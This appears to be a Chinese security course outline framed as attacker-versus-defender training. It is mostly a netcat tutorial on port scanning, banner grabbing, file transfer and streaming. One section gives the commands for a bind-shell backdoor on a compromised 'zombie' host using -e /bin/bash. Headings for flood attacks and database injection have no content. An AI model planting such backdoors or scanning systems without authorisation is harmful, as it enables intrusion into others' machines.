[TOC]
#【课课程介绍】
“矛与盾”互联网中的黑客与红客的斗争，只有知己知彼，才能游刃有余，本次课程咱们站在“黑客”的角度来扫描和测试一个网站的安全性，提出网络安全修改建议，筑起网站服务器的防御盾牌
#【课程知识点】
1. Linux系统常用终端命令
2. 网络入侵利器，瑞士军刀netcat的使用
3. 网站端口扫描，服务器植入后门
4. webbench和ab高并发请求，海量数据攻击
5. 数据库注入与修改

#【课程详情】

## Linux系统常用终端命令

## 网络入侵利器，瑞士军刀netcat的使用
netcat是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，你可以在脚本中以多种方式使用它

netcat所做的就是在两台电脑之间建立链接并返回两个数据流，在这之后所能做的事就看你的想像力了。你能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端

### 端口扫描
端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞。

```
nc -z -v -n -w 1 server_ip 1-1000
```
### 查看banner
Banner是一个文本，Banner是一个你连接的服务发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。

打印运行在这个端口上服务的banner信息

```
nc -v server_ip 21
```
### 即时通讯
假如你想和你的朋友聊聊，有很多的软件和信息服务可以供你使用。但是，如果你没有这么奢侈的配置，比如你在计算机实验室，所有的对外的连接都是被限制的，你怎样和整天坐在隔壁房间的朋友沟通那？不要郁闷了，netcat提供了这样一种方法，你只需要创建一个Chat服务器，一个预先确定好的端口，这样子他就可以联系到你了。

server
```
nc -l 10000
```

clent
```
nc server_ip 10000
```

### 文件传输

大部分时间中，我们都在试图通过网络或者其他工具传输文件。
有很多种方法，比如FTP,SCP,SMB等等，但是当你只是需要临时或者一次传输文件，真的值得浪费时间来安装配置一个软件到你的机器上嘛。
假设，你想要传一个文件file.txt从A到B。

让A作为服务器，B为客户端。

server
```
nc -l 10000 < file.txt
```

client
```
$nc -n server_ip 10000 > file.txt
```

备注：

	'<' : 输入重定向
	'>' : 输出重定向


### 流视频
server
```
cat video.avi | nc -l 10000
```
这里我们只是从一个视频文件中读入并重定向输出到netcat客户端

client
```
nc server_ip 10000 | mplayer -vo x11 -cache 3000 -
```

这里我们从socket中读入数据并重定向到mplayer。

备注：
	sudo apt-get install smyplayer

### 指定源端口
假设你的防火墙过滤除25端口外其它所有端口，你需要使用-p选项指定源端口。
server
```
nc -l 10000
```
client
```
nc server_ip 10000 -p 25
```
使用1024以内的端口需要root权限。
该命令将在客户端开启25端口用于通讯，否则将使用随机端口。

### 指定源地址
假设你的机器有多个地址，希望明确指定使用哪个地址用于外部数据通讯。我们可以在netcat中使用-s选项指定ip地址。

server
```
nc -u -l 10000 < file.txt
```
client
```
nc -u server_ip 10000 -s client_ip > file.txt
```
该命令将绑定地址172.31.100.5。
这仅仅是使用netcat的一些示例。

### telnet客户端

```
nc -t server_ip
```

### 服务器后门
常见的netcat有两种版本，GNU和OPENBSD版本，ubuntu14.04自带的时OPENBSD版本的。不支持-e参数。

请下载安装GNU版本
```
http://netcat.sourceforge.net/
```
编译安装

	./configure
	make
	sudo make install

因为ubuntu已安装netcat，所以出现了重名,查看是否安装成功

	/usr/local/bin/netcat -h


server(肉鸡)
```
/usr/local/bin/netcat -l  -p 10000 -e /bin/bash
```

client(攻击者)
```
/usr/local/bin/netcat server_ip 10000
```

至于怎么在肉鸡上安装netcat，我就不深入探讨了(PS:有点不道德)

### 参数说明

可以运行在TCP或者UDP模式，默认是TCP

	-u 参数调整为udp.
	-z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换
	-v 参数指使用冗余选项,即详细输出
	-n 参数告诉netcat 不要使用DNS反向查询IP地址的域名
	-s 指定本地选用ip地址
	-i 延迟秒数,设置时间间隔，以便传送信息及扫描通信端口
	-l 使用监听模式，监控传入的资料
	-p 设置本地主机使用的通信端口
	-w 超时秒数,设置等待连线的时间


## curl工具

## webbench和ab高并发请求，海量数据攻击

## 数据库注入与修改
